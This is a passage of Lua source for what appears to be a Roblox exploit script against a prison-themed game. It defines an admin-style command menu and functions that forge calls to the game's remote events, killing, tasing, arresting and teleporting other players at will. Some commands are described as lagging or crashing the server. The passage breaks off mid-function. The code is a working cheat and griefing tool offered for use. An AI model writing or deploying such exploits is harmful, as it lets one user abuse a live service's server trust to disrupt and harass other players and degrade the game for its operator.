	CloseBar.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
	CloseBar.BorderSizePixel = 0
	CloseBar.Position = UDim2.new(0.899999976, 0, -0.210084036, 0)
	CloseBar.Size = UDim2.new(0, 25, 0, 25)
	CloseBar.Font = Enum.Font.GothamBlack
	CloseBar.Text = "X"
	CloseBar.TextColor3 = Color3.fromRGB(255, 255, 255)
	CloseBar.TextScaled = true
	CloseBar.TextSize = 14.000
	CloseBar.TextWrapped = true
	CloseBar.MouseButton1Click:Connect(function()
		Background4.Visible = false
	end)

	TransparencyBar.Name = "TransparencyBar"
	TransparencyBar.Parent = Background4
	TransparencyBar.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
	TransparencyBar.BorderSizePixel = 0
	TransparencyBar.Position = UDim2.new(0.799999952, 0, -0.210084036, 0)
	TransparencyBar.Size = UDim2.new(0, 25, 0, 25)
	TransparencyBar.Font = Enum.Font.GothamBlack
	TransparencyBar.Text = "="
	TransparencyBar.TextColor3 = Color3.fromRGB(255, 255, 255)
	TransparencyBar.TextScaled = true
	TransparencyBar.TextSize = 14.000
	TransparencyBar.TextWrapped = true
	TransparencyBar.MouseButton1Click:Connect(function()
		if TransparencyBar.Text == "=" then
			Background4.BackgroundTransparency = 0.750
			CloseBar.BackgroundTransparency = 0.750
			TransparencyBar.BackgroundTransparency = 0.750
			TransparencyBar.Text = "+"
		else
			Background4.BackgroundTransparency = 0.000
			CloseBar.BackgroundTransparency = 0.000
			TransparencyBar.BackgroundTransparency = 0.000
			TransparencyBar.Text = "="
		end
	end)

	local Versions = "5.0"
	local Cmd = {}

	Cmd[#Cmd + 1] = {Text = "versions "..Versions,Title = "Script versions"}
	Cmd[#Cmd + 1] = {Text = "script by LocalPlayer#7434",Title = "Script owner"}
	Cmd[#Cmd + 1] =	{Text = "cmd / cmds",Title = "Show commands bar"}
	Cmd[#Cmd + 1] =	{Text = "rejoin / rj",Title = "Rejoin the game"}
	Cmd[#Cmd + 1] =	{Text = "leave / leaveserver / quit",Title = "Leave the server"}
	Cmd[#Cmd + 1] =	{Text = "admin / giveadmin [plr]",Title = "Give a commands to player"}
	Cmd[#Cmd + 1] =	{Text = "unadmin / removeadmin [plr]",Title = "Remove a commands from player"}
	Cmd[#Cmd + 1] =	{Text = "kill [plr]",Title = "Kill the player"}
	Cmd[#Cmd + 1] =	{Text = "killall",Title = "Kill all players"}
	Cmd[#Cmd + 1] =	{Text = "killguard / killsguard",Title = "Kill all guards"}
	Cmd[#Cmd + 1] =	{Text = "killinmate / killsinmate",Title = "Kill all inmates"}
	Cmd[#Cmd + 1] =	{Text = "killcriminal / killscriminal",Title = "Kill all criminals"}
	Cmd[#Cmd + 1] =	{Text = "tase [plr]",Title = "Tase the player"}
	Cmd[#Cmd + 1] =	{Text = "loopkill / loopkills [plr]",Title = "Loop kills player"}
	Cmd[#Cmd + 1] =	{Text = "unloopkill / unloopkills [plr]",Title = "Unloop kills player"}
	Cmd[#Cmd + 1] =	{Text = "loopkillall / loopkillsall",Title = "Loop kills all players"}
	Cmd[#Cmd + 1] =	{Text = "loopkillguard / loopkillsguard",Title = "Loop kills all guards"}
	Cmd[#Cmd + 1] =	{Text = "loopkillinmate / loopkillinmates",Title = "Loop kills all inmates"}
	Cmd[#Cmd + 1] =	{Text = "loopkillcriminal / loopkillcriminals",Title = "Loop kills all criminals"}
	Cmd[#Cmd + 1] =	{Text = "unloopkillall / unloopkillsall",Title = "Unloop kills all players"}
	Cmd[#Cmd + 1] =	{Text = "unloopkillguard / unloopkillsguard",Title = "Unloop kills all guards"}
	Cmd[#Cmd + 1] =	{Text = "unloopkillinmate / unloopkillinmates",Title = "Unloop kills all inmates"}
	Cmd[#Cmd + 1] =	{Text = "unloopkillcriminal / unloopkillcriminals",Title = "Unloop kills all criminals"}
	Cmd[#Cmd + 1] =	{Text = "inmate / inmates / prisoner / prisoners",Title = "Become inmate team"}
	Cmd[#Cmd + 1] =	{Text = "guard / guards / cop / polices",Title = "Become guard team"}
	Cmd[#Cmd + 1] =	{Text = "crim / criminals / criminal",Title = "Become criminal team"}
	Cmd[#Cmd + 1] =	{Text = "neutral / neutrals",Title = "Become neutral team"}
	Cmd[#Cmd + 1] =	{Text = "re / refresh",Title = "Respawn on old position"}
	Cmd[#Cmd + 1] =	{Text = "res / respawn",Title = "Respawn on respawn pads"}
	Cmd[#Cmd + 1] =	{Text = "goto / to [plr]",Title = "Teleports to the player"}
	Cmd[#Cmd + 1] =	{Text = "bring [plr]",Title = "Teleports player to you"}
	Cmd[#Cmd + 1] =	{Text = "tp / teleport [plr] [plr2]",Title = "Teleports player to another player"}
	Cmd[#Cmd + 1] =	{Text = "arrest [plr] [time]",Title = "Arrest player that is a criminal"}
	Cmd[#Cmd + 1] =	{Text = "arrestall / arrestothers",Title = "Arrest all criminals"}
	Cmd[#Cmd + 1] =	{Text = "spamarrest / looparrest [plr]",Title = "Spam arrest player & lag player and server"}
	Cmd[#Cmd + 1] =	{Text = "unspamarrest / unlooparrest [plr]",Title = "Stop spam arrest player"}
	Cmd[#Cmd + 1] =	{Text = "clearloopkill / clearloopkills",Title = "clear all loop kills table"}
	Cmd[#Cmd + 1] =	{Text = "auto / autore / autorefresh",Title = "Auto respawn on old position when died"}
	Cmd[#Cmd + 1] =	{Text = "unauto / unautore / unautorefresh",Title = "Stop auto respawn on old position when died"}
	Cmd[#Cmd + 1] =	{Text = "killaura",Title = "Activate kill aura"}
	Cmd[#Cmd + 1] =	{Text = "nokillaura / unkillaura",Title = "Unactivate kill aura"}
	Cmd[#Cmd + 1] = {Text = "antifling",Title = "Activate anti fling"}
	Cmd[#Cmd + 1] = {Text = "unantifling",Title = "Unactivate anti fling"}
	Cmd[#Cmd + 1] = {Text = "god",Title = "Become a god mode"}
	Cmd[#Cmd + 1] = {Text = "ungod",Title = "Unbecome a god mode"}
	Cmd[#Cmd + 1] =	{Text = "view / spectate / watch [plr]",Title = "Spectates the player"}
	Cmd[#Cmd + 1] =	{Text = "unview / unspectate / stopwatch",Title = "Unspectates the player"}
	Cmd[#Cmd + 1] =	{Text = "fastpunch / speedpunchh",Title = "Activate fast punch"}
	Cmd[#Cmd + 1] =	{Text = "slowpunch / nofastpunch / normalspeedpunch",Title = "unactivate fast punch"}
	Cmd[#Cmd + 1] =	{Text = "superpunch / onepunch",Title = "Activate super punch"}
	Cmd[#Cmd + 1] =	{Text = "nosuperpunch / normalpunch",Title = "Unactivate super punch"}
	Cmd[#Cmd + 1] =	{Text = "prefix / newprefix / changeprefix [prefix text]",Title = "Changes prefix"}
	Cmd[#Cmd + 1] =	{Text = "red",Title = "Changes name tag color to red color"}
	Cmd[#Cmd + 1] = {Text = "antilag / boostfps",Title = "Boost a little fps"}
	Cmd[#Cmd + 1] = {Text = "unantilag",Title = "Stop boost the fps"}
	Cmd[#Cmd + 1] = {Text = "noclip / noclips",Title = "Activate no clips"}
	Cmd[#Cmd + 1] = {Text = "clip / clips",Title = "Unactivate no clips"}
	Cmd[#Cmd + 1] =	{Text = "orange",Title = "Changes name tag color to orange color"}
	Cmd[#Cmd + 1] =	{Text = "blue",Title = "Changes name tag color to blue color"}
	Cmd[#Cmd + 1] =	{Text = "black",Title = "Changes name tag color to black color"}
	Cmd[#Cmd + 1] =	{Text = "purple",Title = "Changes name tag color to purple color"}
	Cmd[#Cmd + 1] =	{Text = "brown",Title = "Changes name tag color to brown color"}
	Cmd[#Cmd + 1] =	{Text = "white",Title = "Changes name tag color to white color"}
	Cmd[#Cmd + 1] =	{Text = "pink",Title = "Changes name tag color to pink color"}
	Cmd[#Cmd + 1] =	{Text = "grey",Title = "Changes name tag color to grey color"}
	Cmd[#Cmd + 1] =	{Text = "green",Title = "Changes name tag color to green color"}
	Cmd[#Cmd + 1] =	{Text = "yellow",Title = "Changes name tag color to yellow color"}
	Cmd[#Cmd + 1] =	{Text = "getpos",Title = "Prints positions"}
	Cmd[#Cmd + 1] =	{Text = "unload / destroygui",Title = "Unload the scripts"}
	Cmd[#Cmd + 1] =	{Text = "reload / update",Title = "Reload the script to new version"}
	Cmd[#Cmd + 1] =	{Text = "How to open console?",Title = "To open console chat /console or press F9 or Fn + F9"}
	Cmd[#Cmd + 1] =	{Text = "lagserver / disconnect",Title = "Lag server and disconnect after 5 minutes of lagging"}
	Cmd[#Cmd + 1] =	{Text = "unlagserver / undisconnect",Title = "Stop lag server"}
	Cmd[#Cmd + 1] =	{Text = "speed / setspeed / walkspeed [count]",Title = "Changes walk speeds"}
	Cmd[#Cmd + 1] =	{Text = "jumppower / setjumppower [count]",Title = "Changes jump powers"}
	Cmd[#Cmd + 1] =	{Text = "hipheight / sethipheight [count]",Title = "Changes hip heights"}
	Cmd[#Cmd + 1] =	{Text = "gravity / setgravity [count]",Title = "Changes gravity"}
	Cmd[#Cmd + 1] =	{Text = "resetspeed / resetwalkspeed",Title = "Reset walk speeds"}
	Cmd[#Cmd + 1] =	{Text = "resetjumppower / rejumppower",Title = "Reset jump powers"}
	Cmd[#Cmd + 1] =	{Text = "resethipheight / rehipheight",Title = "Reset hip heights"}
	Cmd[#Cmd + 1] =	{Text = "resetgravity / regravity",Title = "Reset gravity"}
	Cmd[#Cmd + 1] =	{Text = "makecrim [plr]",Title = "Make the player become a criminal"}
	Cmd[#Cmd + 1] =	{Text = "makecrimall",Title = "Make all players become a criminals"}
	Cmd[#Cmd + 1] =	{Text = "loopbring [plr]",Title = "Loop bring player"}
	Cmd[#Cmd + 1] =	{Text = "unloopbring ",Title = "Unloop bring player"}
	Cmd[#Cmd + 1] =	{Text = "baseballbat / bat",Title = "Gets bat"}
	Cmd[#Cmd + 1] =	{Text = "superknife",Title = "Gets super knife"}
	Cmd[#Cmd + 1] =	{Text = "firespeed / setfirespeed [count]",Title = "Changes fire speed for the gun"}
	Cmd[#Cmd + 1] =	{Text = "autofire",Title = "Changes gun ststes to auto fire"}
	Cmd[#Cmd + 1] =	{Text = "semifire",Title = "Changes gun ststes to semi fire"}
	Cmd[#Cmd + 1] =	{Text = "burst / burstbullets / bullets [count]",Title = "Changes a bullets for the gun will come out when shot"}
	Cmd[#Cmd + 1] =	{Text = "reloadtime / reloadtimes [count]",Title = "Changes reload times for the gun"}
	Cmd[#Cmd + 1] =	{Text = "gun / guns / allguns",Title = "Obtains all guns"}
	Cmd[#Cmd + 1] =	{Text = "autogun / autoguns / autoallguns",Title = "Activate auto gun when respawned"}
	Cmd[#Cmd + 1] =	{Text = "unautogun / unautoguns / unautoallguns",Title = "Unactivate auto gun when respawned"}
	Cmd[#Cmd + 1] =	{Text = "taserbypass / antitaser / lock",Title = "Bypass taser when got tased"}
	Cmd[#Cmd + 1] =	{Text = "untaserbypass / notaserbypass / unlock",Title = "Unbypass taser when got tased"}
	Cmd[#Cmd + 1] =	{Text = "nodoors / deletedoors",Title = "Deletes all doors"}
	Cmd[#Cmd + 1] =	{Text = "restoredoors / doors",Title = "Restores all doors"}
	Cmd[#Cmd + 1] =	{Text = "nowalls / deletewalls - delete walls",Title = "Deletes all walls"}
	Cmd[#Cmd + 1] =	{Text = "walls / restorewalls - restore walls",Title = "Restore all walls"}
	Cmd[#Cmd + 1] =	{Text = "anticrash / antivest",Title = "Anti crash when someone spamming armor"}
	Cmd[#Cmd + 1] =	{Text = "unanticrash / unantivest",Title = "Unanti crash when someone spamming armor"}
	Cmd[#Cmd + 1] =	{Text = "antishield / noshield",Title = "Anti shield users"}
	Cmd[#Cmd + 1] =	{Text = "unantishield",Title = "Unanti shield users"}
	Cmd[#Cmd + 1] =	{Text = "gatetower",Title = "Teleports to the gate tower"}
	Cmd[#Cmd + 1] =	{Text = "tower",Title = "Teleports to the yard tower"}
	Cmd[#Cmd + 1] =	{Text = "sewer",Title = "Teleports to the sewer"}
	Cmd[#Cmd + 1] = {Text = "yard",Title = "Teleports to yard"}
	Cmd[#Cmd + 1] =	{Text = "backnexus",Title = "Teleports to the back nexus"}
	Cmd[#Cmd + 1] =	{Text = "nexus",Title = "Teleports to the nexus"}
	Cmd[#Cmd + 1] =	{Text = "gate",Title = "Teleports to the gate"}
	Cmd[#Cmd + 1] = {Text = "findowner / checkscriptowner",Title = "Find a script owner in the server"}
	Cmd[#Cmd + 1] = {Text = "getplayer / getplayers",Title = "Get a players counts in the server"}
	Cmd[#Cmd + 1] = {Text = "rapidfire",Title = "Activate rapid fire"}
	Cmd[#Cmd + 1] = {Text = "autorapidfire",Title = "Auto activate rapid fire"}
	Cmd[#Cmd + 1] = {Text = "unautorapidfire",Title = "Unauto activate rapid fire"}
	Cmd[#Cmd + 1] =	{Text = "armory",Title = "Teleports to the armory"}
	Cmd[#Cmd + 1] =	{Text = "cafe - teleport to cafe",Title = "Teleports to the cafeteria"}
	Cmd[#Cmd + 1] =	{Text = "crimbase / criminalbase",Title = "Teleports to the criminals base"}
	Cmd[#Cmd + 1] =	{Text = "lunchroom",Title = "Teleports to the cafeteria room"}
	Cmd[#Cmd + 1] =	{Text = "spamchat [delay]",Title = "Spam the chat"}
	Cmd[#Cmd + 1] =	{Text = "unspamchat",Title = "Unspam the chat"}
	Cmd[#Cmd + 1] =	{Text = "savepos / saveposition",Title = "Saves positions"}
	Cmd[#Cmd + 1] =	{Text = "loadpos / loadposition",Title = "Loads positions"}
	Cmd[#Cmd + 1] =	{Text = "notify",Title = "Send a message when player leave / join"}
	Cmd[#Cmd + 1] =	{Text = "nonotify",Title = "Stop send a message when player leave / join"}
	Cmd[#Cmd + 1] =	{Text = "copychat",Title = "Copies all players chats"}
	Cmd[#Cmd + 1] =	{Text = "uncopychat",Title = "uncopies all players chats"}
	Cmd[#Cmd + 1] =	{Text = "chatnotify",Title = "Chats when player leave / join"}
	Cmd[#Cmd + 1] =	{Text = "unchatnotify / nochatnotify",Title = "Stop chat when player leave / join"}
	Cmd[#Cmd + 1] =	{Text = "opengate",Title = "Open the gate"}
	Cmd[#Cmd + 1] =	{Text = "antifell / antivoid",Title = "Activate anti fell to the void when respawn as custom team"}
	Cmd[#Cmd + 1] =	{Text = "unantifell / unantivoid",Title = "Unactivate anti fell to the void when respawn as custom team"}
	Cmd[#Cmd + 1] =	{Text = "beam [plr]",Title = "Shoot a beam to player"}
	Cmd[#Cmd + 1] =	{Text = "lagbeam / beam2 [plr]",Title = "Shoot a beam to player but lag"}
	Cmd[#Cmd + 1] =	{Text = "crash / beam3 [plr]",Title = "Shoot a beam to player but even more lag"}
	Cmd[#Cmd + 1] = {Text = "antispamarrest",Title = "Activate anti spam arrest"}
	Cmd[#Cmd + 1] = {Text = "unantispamarrest",Title = "Unactivate anti spam arrest"}
	Cmd[#Cmd + 1] =	{Text = "!getprefix",Title = "If you for get prefix you can type this in chat"}

	local Mouse = game.Players.LocalPlayer:GetMouse()

	for i = 1,#Cmd do
		local clone = CmdText:Clone()
		clone.Text = Cmd[i].Text
		clone.Name = "COMMANDS"
		local Ins = Instance.new("StringValue", clone)
		Ins.Name = "Title"
		Ins.Value = Cmd[i].Title
		local Ins2 = Instance.new("StringValue", clone)
		Ins2.Name = "TopbarName"
		Ins2.Value = Cmd[i].Text:split(" ")[1]
		clone.Parent = CmdHandler
		clone.MouseButton1Click:Connect(function()
			Execute:CaptureFocus()
			Execute.Text = clone.Text:split(" ")[1]
			Execute.CursorPosition = #Execute.Text + 1
		end)
	end

	Mouse.Move:Connect(function()
		local Guis = game:GetService("CoreGui"):GetGuiObjectsAtPosition(Mouse.X, Mouse.Y)
		local Gui
		for i,v in pairs(Guis) do
			if v.Parent == CmdHandler then
				Gui = v
			end
		end
		if Gui ~= nil then
			local PositionX
			local PositionY
			local X = Mouse.X
			local Y = Mouse.Y
			if Mouse.X > 200 then
				PositionX = Mouse.X - 201
			else
				PositionX = Mouse.X + 21
			end
			if Mouse.Y > (Mouse.ViewSizeY-96) then
				PositionY = Mouse.Y - 97
			else
				PositionY = Mouse.Y
			end
			Background3.Visible = true
			Background3.Position = UDim2.new(0, PositionX, 0, PositionY)
			Topbar.Text = Gui.TopbarName.Value
			CmdTitle.Text = Gui.Title.Value
		else
			Background3.Visible = false
		end
	end)

	if DisableScript then
		DisableScript()
	end

	local Slient = false
	local ScriptDisabled = false
	local LoopBeam = {}
	local LoopKill = {}
	local LoopTase = {}
	local Admin = {}
	local Watching = nil
	local States = {}
	local BuyGamepass = game:GetService("MarketplaceService"):UserOwnsGamePassAsync(tonumber((game:GetService("Players").LocalPlayer.CharacterAppearance):split('=')[#((game:GetService("Players").LocalPlayer.CharacterAppearance):split('='))]), 96651)

	local function GetPlayer(String)
		if not String then return end
		local Yes = {}
		for _, Player in ipairs(game.Players:GetPlayers()) do
			if string.lower(Player.Name):match(string.lower(String)) or string.lower(Player.DisplayName):match(string.lower(String)) then
				table.insert(Yes, Player)
			end
		end
		if #Yes > 0 then
			return Yes[1]
		elseif #Yes < 1 then
			return nil
		end
	end

	local function GetPos()
		return game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
	end

	local function GetCamPos()
		return workspace.CurrentCamera.CFrame
	end

	local function GetTeam()
		return game.Players.LocalPlayer.TeamColor.Name
	end

	function Goto(Player, Distance)
		local Distance = Distance or CFrame.new(0, 0, 0)
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Player.Character.HumanoidRootPart.CFrame * Distance
	end

	function Split(Arguaments, Split)
		if not Arguaments or not Split then return end
		return Arguaments:split(Split)
	end

	function ChatNotify(Message, Colors, Size)
		game.StarterGui:SetCore("ChatMakeSystemMessage", {
			Text = Message,
			Color = Colors or Color3.fromRGB(255, 255, 255),
			Font = Enum.Font.SourceSans,
			FontSize = Size or Enum.FontSize.Size48
		})
	end

	function Chat(Message, Whisper)
		game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(Message, Whisper or "ALl")
	end

	function WaitForChild(Time, Parent, Child)
		if not Parent or not Child then return end
		if Parent == "LocalPlayer" then Parent = game.Players.LocalPlayer end
		if Parent == "Character" then Parent = game.Players.LocalPlayer.Character end
		if Parent == "Backpack" then Parent = game.Players.LocalPlayer.Character.Backpack end
		local Times = Time * 10 or 1
		repeat wait(.1)
			Time = Time - 1
		until Parent:FindFirstChild(Child) or Time <= 0
		if Parent and Parent:FindFirstChild(Child) then
			return Parent:FindFirstChild(Child)
		else
			return nil
		end
	end

	function Kill(Player)
		pcall(function()
			if Player.Character:FindFirstChild("ForceField") or not workspace:FindFirstChild(Player.Name) or not workspace:FindFirstChild(Player.Name):FindFirstChild("Head") or Player == nil or Player.Character.Parent ~= workspace then return end
			workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)

			local MyTeam = GetTeam()
			if Player.TeamColor.Name == game.Players.LocalPlayer.TeamColor.Name then
				local savedcf = GetPos()
				local savedcamcf = GetCamPos()
				workspace.Remote.loadchar:InvokeServer(nil, BrickColor.random().Name)
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
				workspace.CurrentCamera.CFrame = savedcamcf
				workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
			end

			local Gun = game.Players.LocalPlayer.Character:FindFirstChild("Remington 870") or game.Players.LocalPlayer.Backpack:FindFirstChild("Remington 870")

			local FireEvent = {
				[1] = {
					["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
					["Distance"] = 0, 
					["Cframe"] = CFrame.new(), 
					["Hit"] = workspace[Player.Name].Head
				}, [2] = {
					["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
					["Distance"] = 0, 
					["Cframe"] = CFrame.new(), 
					["Hit"] = workspace[Player.Name].Head
				}, [3] = {
					["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
					["Distance"] = 0, 
					["Cframe"] = CFrame.new(), 
					["Hit"] = workspace[Player.Name].Head
				}, [4] = {
					["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
					["Distance"] = 0, 
					["Cframe"] = CFrame.new(), 
					["Hit"] = workspace[Player.Name].Head
				}, [5] = {
					["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
					["Distance"] = 0, 
					["Cframe"] = CFrame.new(), 
					["Hit"] = workspace[Player.Name].Head
				}, [6] = {
					["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
					["Distance"] = 0, 
					["Cframe"] = CFrame.new(), 
					["Hit"] = workspace[Player.Name].Head
				}, [7] = {
					["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
					["Distance"] = 0, 
					["Cframe"] = CFrame.new(), 
					["Hit"] = workspace[Player.Name].Head
				}, [8] = {
					["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
					["Distance"] = 0, 
					["Cframe"] = CFrame.new(), 
					["Hit"] = workspace[Player.Name].Head
				}
			}

			game:GetService("ReplicatedStorage").ShootEvent:FireServer(FireEvent, Gun)
			Gun.Parent = game.Players.LocalPlayer.Character
			game.Players.LocalPlayer.Character["Remington 870"]:Destroy()
		end)
	end

	function Tase(Player)
		if Player.TeamColor.Name == "Bright blue" or not workspace:FindFirstChild(Player.Name) or not workspace:FindFirstChild(Player.Name):FindFirstChild("Head") or Player == nil or Player.Character.Parent ~= workspace then return end
		pcall(function()
			local savedcf = GetPos()
			local savedteam

			local Gun = game.Players.LocalPlayer.Backpack:FindFirstChild("Taser") or game.Players.LocalPlayer.Character:FindFirstChild("Taser")

			local changedteam = false
			if game.Players.LocalPlayer.TeamColor.Name ~= "Bright blue" or not Gun then
				savedteam = GetTeam()
				workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new("Bright blue").Name)
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
				changedteam = true
			end

			local Guns = game.Players.LocalPlayer.Backpack:FindFirstChild("Taser") or game.Players.LocalPlayer.Character:FindFirstChild("Taser")

			local TaseEvent = 
				{
					[1] = 
					{
						["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
						["Distance"] = 0, 
						["Cframe"] = CFrame.new(), 
						["Hit"] = workspace[Player.Name].Torso
					}
				}

			game:GetService("ReplicatedStorage").ShootEvent:FireServer(TaseEvent, Guns)
			if changedteam then
				workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new(savedteam).Name)
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
			end
		end)
	end

	function Teleport(Player, Position)
		if Player == nil or Position == nil then return end
		local savedcf = GetPos()
		workspace.Remote.loadchar:InvokeServer()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
		workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP)
		local CHAR = game.Players.LocalPlayer.Character
		CHAR.Humanoid.Name = "1"
		local c = CHAR["1"]:Clone()
		c.Name = "Humanoid"
		c.Parent = CHAR
		CHAR["1"]:Destroy()
		game.Workspace.CurrentCamera.CameraSubject = CHAR
		CHAR.Animate.Disabled = true
		wait()
		CHAR.Animate.Disabled = false
		CHAR.Humanoid.DisplayDistanceType = "None"
		game.Players.LocalPlayer:FindFirstChild("Backpack"):FindFirstChild("M9").Parent = CHAR
		local STOP = 0
		repeat wait(.1)
			STOP = STOP + 1
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Player.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 0.75)
		until (not game.Players.LocalPlayer.Character:FindFirstChild("M9") or not game.Players.LocalPlayer.Character.HumanoidRootPart or not Player.Character.HumanoidRootPart or not game.Players.LocalPlayer.Character.HumanoidRootPart.Parent or not Player.Character.HumanoidRootPart.Parent or STOP > 500) and STOP > 3
		local STOP_2 = 0
		repeat wait()
			STOP_2 = STOP_2 + 1
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Position
		until STOP_2 > 10
		workspace.Remote.loadchar:InvokeServer()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
	end

	function TeleportV(Player, Player2)
		if Player == nil or Player2 == nil then return end
		local savedcf = GetPos()
		workspace.Remote.loadchar:InvokeServer()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
		workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP)
		local CHAR = game.Players.LocalPlayer.Character
		CHAR.Humanoid.Name = "1"
		local c = CHAR["1"]:Clone()
		c.Name = "Humanoid"
		c.Parent = CHAR
		CHAR["1"]:Destroy()
		game.Workspace.CurrentCamera.CameraSubject = CHAR
		CHAR.Animate.Disabled = true
		wait()
		CHAR.Animate.Disabled = false
		CHAR.Humanoid.DisplayDistanceType = "None"
		game.Players.LocalPlayer:FindFirstChild("Backpack"):FindFirstChild("M9").Parent = CHAR
		local STOP = 0
		repeat wait(.1)
			STOP = STOP + 1
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Player.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 0.75)
		until (not game.Players.LocalPlayer.Character:FindFirstChild("M9") or not game.Players.LocalPlayer.Character.HumanoidRootPart or not Player.Character.HumanoidRootPart or not game.Players.LocalPlayer.Character.HumanoidRootPart.Parent or not Player.Character.HumanoidRootPart.Parent or STOP > 500) and STOP > 3
		local STOP_2 = 0
		repeat wait()
			STOP_2 = STOP_2 + 1
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Player2.Character.HumanoidRootPart.CFrame
		until STOP_2 > 10
		workspace.Remote.loadchar:InvokeServer()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
	end

	function ArrestEvent(Player, Time)
		for i = 1,Time do
			workspace.Remote.arrest:InvokeServer(Player.Character.Head)
		end
	end

	function Arrest(Player, Time)
		local Time = Time or 1
		local savedcf = GetPos()
		local savedcamcf = GetCamPos()
		local savedteam = GetTeam()
		if Player then
			repeat wait()
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Player.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 1)
				for i = 1,Time do
					coroutine.wrap(function()
						workspace.Remote.arrest:InvokeServer(Player.Character.Head)
					end)()
				end
			until Player.Character:FindFirstChild("Head"):FindFirstChild("handcuffedGui")
			wait()
		end
		workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new(savedteam).Name)
		game.Players.LocalPlayer.Character.Humanoid.Sit = false
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
		workspace.CurrentCamera.CFrame = savedcamcf
	end

	function CreateBeam(Player, Distance, Position)
		if Player then
			pcall(function()
				local Backpack = game.Players.LocalPlayer.Backpack
				local Character = game.Players.LocalPlayer.Character
				local Gun = Backpack:FindFirstChild("Remington 870") or Character:FindFirstChild("Remington 870")
				if not Gun then
					workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
				end
				Gun = Backpack:FindFirstChild("Remington 870") or Character:FindFirstChild("Remington 870")
				local Head = Player.Character.Head
				if Head and Player and Character and Backpack and Gun and Distance and Position then
					game.ReplicatedStorage.ShootEvent:FireServer({
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head}
					}, Gun)
				end
				Gun.Parent = game.Players.LocalPlayer.Character
				game.Players.LocalPlayer.Character:FindFirstChild("Remington 870"):Destroy()
			end)
		end
	end

	function CreateBeam2(Player, Distance, Position)
		if Player then
			pcall(function()
				local Backpack = game.Players.LocalPlayer.Backpack
				local Character = game.Players.LocalPlayer.Character
				local Gun = Backpack:FindFirstChild("AK-47") or Character:FindFirstChild("AK-47")
				if not Gun then
					workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["AK-47"].ITEMPICKUP)
				end
				Gun = Backpack:FindFirstChild("AK-47") or Character:FindFirstChild("AK-47")
				local Head = Player.Character.Head
				if Head and Player and Character and Backpack and Gun and Distance and Position then
					game.ReplicatedStorage.ShootEvent:FireServer({
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
